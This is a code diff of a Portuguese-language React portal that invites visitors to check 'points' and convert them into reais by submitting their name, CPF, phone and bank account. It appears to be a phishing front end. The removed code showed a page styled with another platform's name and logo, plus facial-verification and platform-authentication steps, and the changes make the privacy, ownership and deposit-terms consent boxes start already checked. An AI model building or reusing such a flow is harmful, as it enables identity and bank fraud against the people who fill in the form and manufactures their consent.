@@ -20,14 +20,11 @@ import {
   isValidBrPhone,
   isValidCpf,
   isValidFullName,
-  isValidOptionalBankDigit,
   isValidRequiredBankDigit,
   normalizeFullName,
   onlyDigits,
 } from '../utils/validation';
 import { BrandMark } from './BrandMark';
-import { FacialVerificationStep } from './FacialVerificationStep';
-import { PlatformAuthStep } from './PlatformAuthStep';
 
 interface PublicPortalProps {
   settings: SiteSettings;
@@ -41,17 +38,13 @@ type FlowStep =
   | 'analisando'
   | 'resultado'
   | 'confirmacao'
-  | 'conectando'
-  | 'resgate'
-  | 'verificacao_facial'
-  | 'autenticacao'
   | 'resgatado';
+
 type LegalDocType = 'regulamento' | 'privacidade' | null;
 
 export function PublicPortal({
   settings,
   storageError,
-  onSettingsUpdated,
   onNavigate,
 }: PublicPortalProps) {
   const prefersReducedMotion = useReducedMotion();
@@ -61,21 +54,20 @@ export function PublicPortal({
   const [fullName, setFullName] = useState('');
   const [cpf, setCpf] = useState('');
   const [phone, setPhone] = useState('');
-  const [acceptedPrivacy, setAcceptedPrivacy] = useState(false);
+  const [acceptedPrivacy, setAcceptedPrivacy] = useState(true);
 
   const [step, setStep] = useState<FlowStep>('inicio');
   const [formError, setFormError] = useState<string | null>(null);
 
   // Etapa 2 & 3: Registro + confirmação explícita de titularidade + conta corrente
   const [consultaResult, setConsultaResult] = useState<ConsultaPublicResult | null>(null);
-  const [ownershipChecked, setOwnershipChecked] = useState(false);
+  const [ownershipChecked, setOwnershipChecked] = useState(true);
   const [ownershipConfirmed, setOwnershipConfirmed] = useState(false);
 
+  const [bankLabel, setBankLabel] = useState('Banco do Brasil — 001');
   const [agency, setAgency] = useState('');
-  const [agencyDigit, setAgencyDigit] = useState('');
   const [accountNumber, setAccountNumber] = useState('');
-  const [accountDigit, setAccountDigit] = useState('');
-  const [acceptedDepositTerms, setAcceptedDepositTerms] = useState(false);
+  const [acceptedDepositTerms, setAcceptedDepositTerms] = useState(true);
 
   const [stepError, setStepError] = useState<string | null>(null);
   const [submittingRedeem, setSubmittingRedeem] = useState(false);
@@ -84,9 +76,6 @@ export function PublicPortal({
   const [legalModal, setLegalModal] = useState<LegalDocType>(null);
 
   const nameInputRef = useRef<HTMLInputElement>(null);
-
-  const rp = settings.redemptionPage;
-  const platformLogoUrl = rp.redemptionLogoUrl || settings.brandLogoUrl;
 
   useEffect(() => {
     if (prefersReducedMotion) {
@@ -167,13 +156,12 @@ export function PublicPortal({
       }
 
       setConsultaResult(data);
-      setOwnershipChecked(false);
+      setOwnershipChecked(true);
       setOwnershipConfirmed(false);
+      setBankLabel('Banco do Brasil — 001');
       setAgency('');
-      setAgencyDigit('');
       setAccountNumber('');
-      setAccountDigit('');
-      setAcceptedDepositTerms(false);
+      setAcceptedDepositTerms(true);
       setStepError(null);
       transitionToStep('resultado');
     } catch {
@@ -193,67 +181,33 @@ export function PublicPortal({
     setOwnershipConfirmed(true);
   }
 
-  async function handleOpenYellowRedemption(): Promise<void> {
-    if (!consultaResult) return;
-    setStepError(null);
-    transitionToStep('conectando');
-
-    const minVisual = prefersReducedMotion
-      ? Promise.resolve()
-      : new Promise<void>((resolve) => window.setTimeout(resolve, 650));
-
-    try {
-      const [response] = await Promise.all([
-        fetch(`/api/consultas/${encodeURIComponent(consultaResult.id)}/preparar-resgate`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ claimToken: consultaResult.claimToken }),
-        }),
-        minVisual,
-      ]);
-
-      const data = (await response.json()) as {
-        consulta?: ConsultaPublicResult;
-        settings?: SiteSettings;
-        error?: string;
-      };
-
-      if (!response.ok || !data.consulta) {
-        setStepError(data.error || 'Não foi possível carregar os dados cadastrais para resgate.');
-        transitionToStep('confirmacao');
-        return;
-      }
-
-      if (data.settings && onSettingsUpdated) {
-        onSettingsUpdated(data.settings);
-      }
-      setConsultaResult(data.consulta);
-      transitionToStep('resgate');
-    } catch {
-      setStepError('Erro de conexão ao preparar a página de resgate. Tente novamente.');
-      transitionToStep('confirmacao');
-    }
-  }
-
   async function handleSubmitRedeem(e: FormEvent): Promise<void> {
     e.preventDefault();
     if (!consultaResult) return;
     setStepError(null);
 
+    const normalizedBank = bankLabel.trim();
+    if (normalizedBank.length < 2) {
+      setStepError('Informe o banco de sua conta corrente.');
+      return;
+    }
+
     if (!isValidBankAgency(agency)) {
       setStepError('Informe o número da agência com 3 a 5 dígitos.');
       return;
     }
-    if (rp.showAgencyDigit && !isValidOptionalBankDigit(agencyDigit)) {
-      setStepError('O dígito da agência deve ter 1 número ou X (ou ficar em branco se não houver).');
-      return;
-    }
-    if (!isValidBankAccount(accountNumber)) {
-      setStepError('Informe o número da conta corrente com pelo menos 4 dígitos.');
-      return;
-    }
-    if (!isValidRequiredBankDigit(accountDigit)) {
-      setStepError('Informe o dígito verificador da conta corrente (0 a 9 ou X).');
+
+    const sanitizedAccount = accountNumber.replace(/[^0-9xX]/g, '').toUpperCase();
+    const parsedAccount = sanitizedAccount.slice(0, -1);
+    const parsedAccountDigit = sanitizedAccount.slice(-1);
+
+    if (
+      sanitizedAccount.length < 5 ||
+      !/^\d{4,12}$/.test(parsedAccount) ||
+      !isValidBankAccount(parsedAccount) ||
+      !isValidRequiredBankDigit(parsedAccountDigit)
+    ) {
+      setStepError('Informe a conta corrente completa com o dígito verificador (ex.: 123456-0).');
       return;
     }
     if (!acceptedDepositTerms) {
@@ -270,10 +224,11 @@ export function PublicPortal({
           claimToken: consultaResult.claimToken,
           ownershipConfirmed: true,
           acceptedTerms: true,
+          bankLabel: normalizedBank,
           agency: onlyDigits(agency),
-          agencyDigit: rp.showAgencyDigit ? agencyDigit.trim().toUpperCase() : '',
-          accountNumber: onlyDigits(accountNumber),
-          accountDigit: accountDigit.trim().toUpperCase(),
+          agencyDigit: '',
+          accountNumber: parsedAccount,
+          accountDigit: parsedAccountDigit,
         }),
       });
       const data = (await response.json()) as ConsultaPublicResult & { error?: string };
@@ -282,7 +237,7 @@ export function PublicPortal({
         return;
       }
       setConsultaResult(data);
-      transitionToStep('verificacao_facial');
+      transitionToStep('resgatado');
     } catch {
       setStepError('Erro de conexão ao registrar a solicitação. Tente novamente.');
     } finally {
@@ -295,14 +250,13 @@ export function PublicPortal({
     setFullName('');
     setCpf('');
     setPhone('');
-    setAcceptedPrivacy(false);
-    setOwnershipChecked(false);
+    setAcceptedPrivacy(true);
+    setOwnershipChecked(true);
     setOwnershipConfirmed(false);
+    setBankLabel('Banco do Brasil — 001');
     setAgency('');
-    setAgencyDigit('');
     setAccountNumber('');
-    setAccountDigit('');
-    setAcceptedDepositTerms(false);
+    setAcceptedDepositTerms(true);
     setFormError(null);
     setStepError(null);
     transitionToStep('inicio');
@@ -310,12 +264,7 @@ export function PublicPortal({
 
   const displayPoints = consultaResult?.pointsAvailable ?? CAMPAIGN_POINTS_GRANT;
   const displayAmountBrl = consultaResult?.amountBrl ?? CAMPAIGN_BRL_VALUE;
-  const isYellowRedemptionPage =
-    step === 'conectando' ||
-    step === 'resgate' ||
-    step === 'verificacao_facial' ||
-    step === 'autenticacao' ||
-    step === 'resgatado';
+  const isConsultaHeroStep = step === 'inicio' || step === 'analisando' || step === 'resultado';
 
   return (
     <div className="min-h-screen flex flex-col bg-white text-[#151515]">
@@ -368,8 +317,8 @@ export function PublicPortal({
       <header className="sticky top-0 z-30 bg-white/95 backdrop-blur-sm border-b border-neutral-200">
         <div className="max-w-5xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-8">
           <BrandMark
-            brandName={isYellowRedemptionPage ? rp.platformName : settings.brandName}
-            brandLogoUrl={isYellowRedemptionPage ? platformLogoUrl : settings.brandLogoUrl}
+            brandName={settings.brandName}
+            brandLogoUrl={settings.brandLogoUrl}
             onClick={handleReset}
           />
 
@@ -419,12 +368,11 @@ export function PublicPortal({
           </div>
         )}
 
-        {/* ETAPAS 1 e 2 */}
-        {step !== 'confirmacao' && !isYellowRedemptionPage && (
+        {/* ETAPAS 1 e 2: Consulta e Resultado */}
+        {isConsultaHeroStep && (
           <section className="flex-1 bg-[#151515] text-white flex items-center">
             <div className="w-full max-w-5xl mx-auto px-4 sm:px-6 py-10 lg:py-16">
               {step === 'resultado' && consultaResult ? (
-                /* TELA 2 — RESULTADO DA CONSULTA (sem botão Voltar, CTA largo e de destaque) */
                 <motion.div
                   key="tela-resultado"
                   initial={{ opacity: 0, y: 12 }}
@@ -458,7 +406,7 @@ export function PublicPortal({
                         PONTOS DISPONÍVEIS PARA RESGATE
                       </p>
                       <p className="font-display text-3xl sm:text-4xl font-bold text-[#151515] tabular-nums">
-                        {displayPoints.toLocaleString('pt-BR')} PONTOS
+                        {displayPoints.toLocaleString('pt-BR')} {settings.pointsLabel.toUpperCase()}
                       </p>
                     </div>
 
@@ -484,12 +432,11 @@ export function PublicPortal({
                     }}
                     className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm focus:outline-none focus-visible:ring-2 focus-visible:ring-[#FE0A8C] focus-visible:ring-offset-2"
                   >
-                    <span>{rp.convertButtonText || 'CONVERTER PONTOS EM REAIS'}</span>
+                    <span>CONVERTER PONTOS EM REAIS</span>
                     <ArrowRight className="w-5 h-5" aria-hidden="true" />
                   </button>
                 </motion.div>
               ) : (
-                /* TELA 1 — FORMULÁRIO CONSULTE SEUS PONTOS */
                 <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-12 items-center">
                   <motion.div
                     initial={prefersReducedMotion ? false : { opacity: 0, y: 12 }}
@@ -508,10 +455,11 @@ export function PublicPortal({
                       className="font-display font-bold text-white tracking-tight leading-[1.12] mb-4"
                       style={{ fontSize: 'clamp(2rem, 3.6vw, 3rem)', textWrap: 'balance' }}
                     >
-                      CONSULTE SEUS PONTOS
+                      {settings.heroTitle || 'CONSULTE SEUS PONTOS'}
                     </h1>
                     <p className="text-base text-neutral-300 leading-relaxed max-w-md mb-8">
-                      Realize sua consulta e confira seus pontos disponíveis para conversão em reais.
+                      {settings.heroSubtitle ||
+                        'Realize sua consulta e confira seus pontos disponíveis para conversão em reais.'}
                     </p>
 
                     <div className="border-t border-white/15 pt-6 space-y-3 text-sm text-neutral-300">
@@ -552,7 +500,7 @@ export function PublicPortal({
                           >
                             <div className="mb-2">
                               <h2 className="font-display text-xl sm:text-2xl font-bold text-[#151515] tracking-tight">
-                                CONSULTE SEUS PONTOS
+                                {settings.formHeading || 'CONSULTE SEUS PONTOS'}
                               </h2>
                               <p className="text-sm text-neutral-600 mt-1">
                                 Realize sua consulta e confira seus pontos disponíveis para conversão em reais.
@@ -720,7 +668,7 @@ export function PublicPortal({
           </section>
         )}
 
-        {/* ETAPA 3A — CONFIRMAÇÃO DE TITULARIDADE (sem Pix e sem botão Voltar) */}
+        {/* ETAPA 3 — CONFIRMAÇÃO DE TITULARIDADE E DADOS PARA DEPÓSITO (tema padrão do portal) */}
         {step === 'confirmacao' && consultaResult && (
           <section className="flex-1 bg-neutral-50 py-10 lg:py-16">
             <div className="max-w-2xl mx-auto px-4 sm:px-6">
@@ -738,7 +686,7 @@ export function PublicPortal({
                   Confirmação de titularidade
                 </h1>
                 <p className="text-sm text-neutral-600 mb-6">
-                  Confira seus dados cadastrais e confirme a titularidade para liberar a etapa de resgate.
+                  Confira seus dados cadastrais e confirme a titularidade para informar a conta corrente de depósito.
                 </p>
 
                 <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-6">
@@ -757,7 +705,7 @@ export function PublicPortal({
                   <div className="px-4 py-3.5 flex items-center justify-between gap-4">
                     <dt className="text-neutral-500">Quantidade de pontos</dt>
                     <dd className="font-mono font-semibold text-[#151515] tabular-nums">
-                      {displayPoints.toLocaleString('pt-BR')} pontos
+                      {displayPoints.toLocaleString('pt-BR')} {settings.pointsLabel}
                     </dd>
                   </div>
                   <div className="px-4 py-3.5 flex items-center justify-between gap-4">
@@ -784,417 +732,237 @@ export function PublicPortal({
                   </span>
                 </label>
 
-                {stepError && (
-                  <div
-                    role="alert"
-                    className="mb-5 p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
-                  >
-                    <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
-                    <span>{stepError}</span>
-                  </div>
-                )}
-
                 {!ownershipConfirmed ? (
-                  <button
-                    type="button"
-                    onClick={handleConfirmOwnershipAction}
-                    className="w-full h-14 px-6 bg-[#151515] hover:bg-neutral-800 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer"
-                  >
-                    <span>{rp.ownershipButtonText || 'CONFIRMAR TITULARIDADE'}</span>
-                    <ArrowRight className="w-5 h-5" aria-hidden="true" />
-                  </button>
-                ) : (
-                  <div className="space-y-4">
-                    <div className="p-3.5 rounded-lg bg-emerald-50 border border-emerald-200 text-xs sm:text-sm text-emerald-800 flex items-center gap-2">
-                      <CheckCircle2 className="w-4 h-4 shrink-0" aria-hidden="true" />
-                      <span>Titularidade confirmada. Prossiga para informar os dados de conta corrente.</span>
-                    </div>
+                  <>
+                    {stepError && (
+                      <div
+                        role="alert"
+                        className="mb-5 p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
+                      >
+                        <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
+                        <span>{stepError}</span>
+                      </div>
+                    )}
 
                     <button
                       type="button"
-                      onClick={() => void handleOpenYellowRedemption()}
-                      className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm"
+                      onClick={handleConfirmOwnershipAction}
+                      className="w-full h-14 px-6 bg-[#151515] hover:bg-neutral-800 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer"
                     >
-                      <span>{rp.requestButtonText || 'SOLICITAR RESGATE'}</span>
+                      <span>CONFIRMAR TITULARIDADE</span>
                       <ArrowRight className="w-5 h-5" aria-hidden="true" />
                     </button>
-                  </div>
+                  </>
+                ) : (
+                  <form onSubmit={handleSubmitRedeem} noValidate className="space-y-5 pt-2 border-t border-neutral-200">
+                    <div className="p-3.5 rounded-lg bg-emerald-50 border border-emerald-200 text-xs sm:text-sm text-emerald-800 flex items-center gap-2">
+                      <CheckCircle2 className="w-4 h-4 shrink-0" aria-hidden="true" />
+                      <span>Titularidade confirmada. Informe os dados da conta corrente de sua titularidade para depósito.</span>
+                    </div>
+
+                    <div>
+                      <label
+                        htmlFor="bank-name"
+                        className="block text-sm font-medium text-[#151515] mb-1.5"
+                      >
+                        <span className="inline-flex items-center gap-1.5">
+                          <Building2 className="w-4 h-4 text-neutral-500" aria-hidden="true" />
+                          <span>Banco</span>
+                        </span>
+                      </label>
+                      <input
+                        id="bank-name"
+                        type="text"
+                        required
+                        maxLength={80}
+                        value={bankLabel}
+                        onChange={(e) => {
+                          setBankLabel(e.target.value);
+                          if (stepError) setStepError(null);
+                        }}
+                        placeholder="Ex.: Banco do Brasil — 001"
+                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
+                      />
+                    </div>
+
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                      <div>
+                        <label
+                          htmlFor="bank-agency"
+                          className="block text-sm font-medium text-[#151515] mb-1.5"
+                        >
+                          Agência
+                        </label>
+                        <input
+                          id="bank-agency"
+                          type="text"
+                          inputMode="numeric"
+                          required
+                          maxLength={5}
+                          value={agency}
+                          onChange={(e) => {
+                            setAgency(onlyDigits(e.target.value).slice(0, 5));
+                            if (stepError) setStepError(null);
+                          }}
+                          placeholder="Ex.: 1234"
+                          className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
+                        />
+                      </div>
+
+                      <div>
+                        <label
+                          htmlFor="bank-account"
+                          className="block text-sm font-medium text-[#151515] mb-1.5"
+                        >
+                          Conta corrente (com dígito)
+                        </label>
+                        <input
+                          id="bank-account"
+                          type="text"
+                          inputMode="text"
+                          required
+                          maxLength={14}
+                          value={accountNumber}
+                          onChange={(e) => {
+                            setAccountNumber(e.target.value.replace(/[^0-9xX-]/g, '').toUpperCase());
+                            if (stepError) setStepError(null);
+                          }}
+                          placeholder="Ex.: 123456-0"
+                          className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
+                        />
+                      </div>
+                    </div>
+
+                    <div className="p-3.5 rounded-lg bg-neutral-50 border border-neutral-200 text-xs text-neutral-600 leading-relaxed flex items-start gap-2">
+                      <ShieldCheck className="w-4 h-4 text-[#FE0A8C] shrink-0 mt-0.5" aria-hidden="true" />
+                      <span>
+                        A solicitação será analisada e processada para a conta corrente informada. Nunca solicitamos senha bancária, código de autenticação pessoal ou cobrança de taxa.
+                      </span>
+                    </div>
+
+                    <label className="flex items-start gap-2.5 text-xs sm:text-sm text-[#151515] cursor-pointer">
+                      <input
+                        type="checkbox"
+                        checked={acceptedDepositTerms}
+                        onChange={(e) => {
+                          setAcceptedDepositTerms(e.target.checked);
+                          if (stepError) setStepError(null);
+                        }}
+                        className="mt-0.5 accent-[#FE0A8C] w-4 h-4 shrink-0"
+                      />
+                      <span>
+                        Confirmo que a conta corrente informada é de minha titularidade e autorizo o registro da solicitação de resgate de {formatBrl(displayAmountBrl)}.
+                      </span>
+                    </label>
+
+                    {stepError && (
+                      <div
+                        role="alert"
+                        className="p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-center gap-2"
+                      >
+                        <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
+                        <span>{stepError}</span>
+                      </div>
+                    )}
+
+                    <button
+                      type="submit"
+                      disabled={submittingRedeem}
+                      className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] disabled:bg-[#FE0A8C]/60 text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm"
+                    >
+                      <span>
+                        {submittingRedeem ? 'Registrando solicitação...' : 'SOLICITAR RESGATE'}
+                      </span>
+                      {!submittingRedeem && <ArrowRight className="w-5 h-5" aria-hidden="true" />}
+                    </button>
+                  </form>
                 )}
               </motion.div>
             </div>
           </section>
         )}
 
-        {/* TELA DE CARREGAMENTO ANTES DA PÁGINA AMARELA ("CONECTANDO...") */}
-        {step === 'conectando' && consultaResult && (
-          <section
-            className="flex-1 flex items-center justify-center py-14 px-4 transition-colors"
-            style={{ backgroundColor: rp.backgroundColor || '#FFED00' }}
-          >
-            <motion.div
-              key="conectando-screen"
-              initial={{ opacity: 0, scale: 0.97 }}
-              animate={{ opacity: 1, scale: 1 }}
-              transition={{ duration: 0.25 }}
-              className="w-full max-w-md bg-[#151515] text-white rounded-2xl border border-black/15 p-8 sm:p-10 text-center shadow-lg"
-            >
-              <div className="relative w-24 h-24 mx-auto mb-6 flex items-center justify-center">
-                <Loader2
-                  className="w-24 h-24 text-[#FFED00] animate-spin absolute inset-0"
-                  aria-hidden="true"
-                />
-                <motion.div
-                  animate={prefersReducedMotion ? undefined : { scale: [1, 1.08, 1], opacity: [0.9, 1, 0.9] }}
-                  transition={{ duration: 1.4, repeat: Infinity, ease: 'easeInOut' }}
-                  className="w-16 h-16 rounded-xl bg-white flex items-center justify-center p-2 shadow-sm"
-                >
-                  {platformLogoUrl ? (
-                    <img
-                      src={platformLogoUrl}
-                      alt={rp.platformName}
-                      referrerPolicy="no-referrer"
-                      className="max-h-11 max-w-full object-contain"
-                    />
-                  ) : (
-                    <span className="font-display font-bold text-base text-[#151515]">
-                      {rp.platformName.slice(0, 2).toUpperCase()}
-                    </span>
-                  )}
-                </motion.div>
-              </div>
-
-              <h1 className="font-display text-2xl font-bold tracking-wide text-[#FFED00] mb-2">
-                {rp.loadingTitle || 'CONECTANDO...'}
-              </h1>
-              <p className="text-sm text-neutral-300 leading-relaxed">
-                {rp.loadingSubtitle || 'Carregando seus dados cadastrais. Aguarde...'}
-              </p>
-            </motion.div>
-          </section>
-        )}
-
-        {/* ETAPA 3B, 3C, 4 e 5 — PÁGINA AMARELA DE RESGATE, VERIFICAÇÃO FACIAL, AUTENTICAÇÃO E TELA FINAL */}
-        {isYellowRedemptionPage && step !== 'conectando' && consultaResult && (
-          <section
-            className="flex-1 py-10 lg:py-16 transition-colors"
-            style={{ backgroundColor: rp.backgroundColor || '#FFED00' }}
-          >
+        {/* ETAPA 4 — TELA FINAL DO RESGATE (tema padrão do portal) */}
+        {step === 'resgatado' && consultaResult && (
+          <section className="flex-1 bg-neutral-50 py-10 lg:py-16">
             <div className="max-w-2xl mx-auto px-4 sm:px-6">
-              {/* Cabeçalho da Plataforma no Topo da Página Amarela */}
-              <div className="mb-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-white/95 border border-black/10 rounded-xl p-5">
-                <div className="flex items-center gap-3 min-w-0">
-                  {platformLogoUrl ? (
-                    <img
-                      src={platformLogoUrl}
-                      alt={rp.platformName}
-                      referrerPolicy="no-referrer"
-                      className="h-10 sm:h-11 w-auto max-w-[160px] object-contain shrink-0"
-                    />
-                  ) : (
-                    <div className="w-10 h-10 rounded-lg bg-[#151515] text-white font-display font-bold text-sm flex items-center justify-center shrink-0">
-                      {rp.platformName.slice(0, 2).toUpperCase()}
-                    </div>
-                  )}
-                  <div className="min-w-0">
-                    <p className="font-display font-bold text-base sm:text-lg text-[#151515] truncate">
-                      {rp.platformName}
-                    </p>
-                    <p className="text-xs text-neutral-600 truncate">{rp.companyName}</p>
-                  </div>
-                </div>
-
-                <div className="sm:text-right border-t sm:border-t-0 pt-3 sm:pt-0 border-neutral-200">
-                  <p className="text-xs text-neutral-500">Valor do resgate</p>
-                  <p className="font-display text-xl sm:text-2xl font-bold text-[#151515] tabular-nums">
-                    {formatBrl(displayAmountBrl)}
-                  </p>
-                </div>
-              </div>
-
-              {step === 'resgate' ? (
-                <motion.form
-                  key="yellow-redemption-form"
-                  onSubmit={handleSubmitRedeem}
-                  noValidate
-                  initial={{ opacity: 0, y: 10 }}
-                  animate={{ opacity: 1, y: 0 }}
-                  transition={{ duration: 0.25 }}
-                  className="bg-white text-[#151515] border border-black/10 rounded-xl p-6 sm:p-8"
-                >
-                  <p className="text-sm font-semibold text-[#C8006B] mb-1">
-                    Olá, {consultaResult.profileLabel}
-                  </p>
-                  <h1 className="font-display text-xl sm:text-2xl font-bold text-[#151515] tracking-tight mb-2">
-                    {rp.title}
+              <motion.div
+                key="redemption-done"
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.25 }}
+                className="bg-white text-[#151515] border border-neutral-200 rounded-xl p-6 sm:p-8"
+              >
+                <div className="flex items-center gap-2.5 text-emerald-700 mb-2">
+                  <CheckCircle2 className="w-7 h-7 shrink-0" aria-hidden="true" />
+                  <h1 className="font-display text-xl sm:text-2xl font-bold text-[#151515]">
+                    SOLICITAÇÃO DE RESGATE RECEBIDA!
                   </h1>
-                  <p className="text-sm text-neutral-600 leading-relaxed mb-5">{rp.subtitle}</p>
+                </div>
+                <p className="text-sm text-neutral-600 leading-relaxed mb-6">
+                  Seus dados foram enviados com sucesso. Acompanhe o processamento do seu resgate.
+                </p>
 
-                  {/* Resumo do beneficiário e banco fixo */}
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-5">
-                    <div className="p-3.5 rounded-lg bg-neutral-50 border border-neutral-200">
-                      <p className="text-xs text-neutral-500 mb-0.5 flex items-center gap-1.5">
-                        <Building2 className="w-3.5 h-3.5 shrink-0" aria-hidden="true" />
-                        <span>Banco</span>
-                      </p>
-                      <p className="font-display font-bold text-sm text-[#151515]">
-                        {rp.bankLabel}
-                      </p>
-                    </div>
-                    <div className="p-3.5 rounded-lg bg-neutral-50 border border-neutral-200">
-                      <p className="text-xs text-neutral-500 mb-0.5">Nome do titular</p>
-                      <p className="font-semibold text-sm text-[#151515] truncate">
-                        {consultaResult.profileLabel}
-                      </p>
-                    </div>
+                <dl className="bg-neutral-50 border border-neutral-200 rounded-lg divide-y divide-neutral-200 text-sm mb-5">
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Beneficiário</dt>
+                    <dd className="font-semibold text-[#151515] text-right">
+                      {consultaResult.profileLabel}
+                    </dd>
                   </div>
-
-                  <p className="text-xs text-neutral-600 mb-5 leading-relaxed">
-                    {rp.depositInstructions}
-                  </p>
-
-                  {/* Formulário para depósito em conta corrente (sem senha/código/token) */}
-                  <div className="grid grid-cols-1 sm:grid-cols-12 gap-4 mb-5">
-                    <div className={rp.showAgencyDigit ? 'sm:col-span-8' : 'sm:col-span-12'}>
-                      <label
-                        htmlFor="bank-agency"
-                        className="block text-sm font-medium text-[#151515] mb-1.5"
-                      >
-                        Agência
-                      </label>
-                      <input
-                        id="bank-agency"
-                        type="text"
-                        inputMode="numeric"
-                        required
-                        maxLength={5}
-                        value={agency}
-                        onChange={(e) => {
-                          setAgency(onlyDigits(e.target.value).slice(0, 5));
-                          if (stepError) setStepError(null);
-                        }}
-                        placeholder="Ex.: 1234"
-                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#151515] focus:ring-2 focus:ring-[#151515]/15"
-                      />
-                    </div>
-
-                    {rp.showAgencyDigit && (
-                      <div className="sm:col-span-4">
-                        <label
-                          htmlFor="bank-agency-digit"
-                          className="block text-sm font-medium text-[#151515] mb-1.5"
-                        >
-                          Dígito (opcional)
-                        </label>
-                        <input
-                          id="bank-agency-digit"
-                          type="text"
-                          maxLength={1}
-                          value={agencyDigit}
-                          onChange={(e) => {
-                            setAgencyDigit(e.target.value.replace(/[^0-9xX]/g, '').toUpperCase().slice(0, 1));
-                            if (stepError) setStepError(null);
-                          }}
-                          placeholder="0 ou X"
-                          className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono uppercase tabular-nums text-[#151515] focus:outline-none focus:border-[#151515] focus:ring-2 focus:ring-[#151515]/15"
-                        />
-                      </div>
-                    )}
-
-                    <div className="sm:col-span-8">
-                      <label
-                        htmlFor="bank-account"
-                        className="block text-sm font-medium text-[#151515] mb-1.5"
-                      >
-                        Conta corrente
-                      </label>
-                      <input
-                        id="bank-account"
-                        type="text"
-                        inputMode="numeric"
-                        required
-                        maxLength={12}
-                        value={accountNumber}
-                        onChange={(e) => {
-                          setAccountNumber(onlyDigits(e.target.value).slice(0, 12));
-                          if (stepError) setStepError(null);
-                        }}
-                        placeholder="Ex.: 123456"
-                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#151515] focus:ring-2 focus:ring-[#151515]/15"
-                      />
-                    </div>
-
-                    <div className="sm:col-span-4">
-                      <label
-                        htmlFor="bank-account-digit"
-                        className="block text-sm font-medium text-[#151515] mb-1.5"
-                      >
-                        Dígito da conta
-                      </label>
-                      <input
-                        id="bank-account-digit"
-                        type="text"
-                        required
-                        maxLength={1}
-                        value={accountDigit}
-                        onChange={(e) => {
-                          setAccountDigit(e.target.value.replace(/[^0-9xX]/g, '').toUpperCase().slice(0, 1));
-                          if (stepError) setStepError(null);
-                        }}
-                        placeholder="0 ou X"
-                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono uppercase tabular-nums text-[#151515] focus:outline-none focus:border-[#151515] focus:ring-2 focus:ring-[#151515]/15"
-                      />
-                    </div>
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Valor solicitado</dt>
+                    <dd className="font-display font-bold text-[#151515] tabular-nums">
+                      {formatBrl(displayAmountBrl)}
+                    </dd>
                   </div>
-
-                  <div className="mb-5 p-3.5 rounded-lg bg-neutral-50 border border-neutral-200 text-xs text-neutral-600 leading-relaxed flex items-start gap-2">
-                    <ShieldCheck className="w-4 h-4 text-[#151515] shrink-0 mt-0.5" aria-hidden="true" />
-                    <span>{rp.infoText}</span>
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Banco</dt>
+                    <dd className="font-medium text-[#151515] text-right">
+                      {consultaResult.bankLabel || bankLabel}
+                    </dd>
                   </div>
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Agência / Conta corrente</dt>
+                    <dd className="font-mono font-medium text-[#151515] tabular-nums text-right">
+                      Ag. {consultaResult.agencyMasked || '-'} · CC {consultaResult.accountMasked || '-'}
+                    </dd>
+                  </div>
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Número de protocolo</dt>
+                    <dd className="font-mono font-semibold text-[#151515] tabular-nums">
+                      {consultaResult.protocol}
+                    </dd>
+                  </div>
+                  <div className="px-4 py-3 flex items-center justify-between gap-4">
+                    <dt className="text-neutral-500">Situação da solicitação</dt>
+                    <dd className="font-semibold text-[#C8006B] text-right">
+                      Em análise cadastral e bancária
+                    </dd>
+                  </div>
+                </dl>
 
-                  <label className="flex items-start gap-2.5 mb-6 text-xs sm:text-sm text-neutral-700 cursor-pointer">
-                    <input
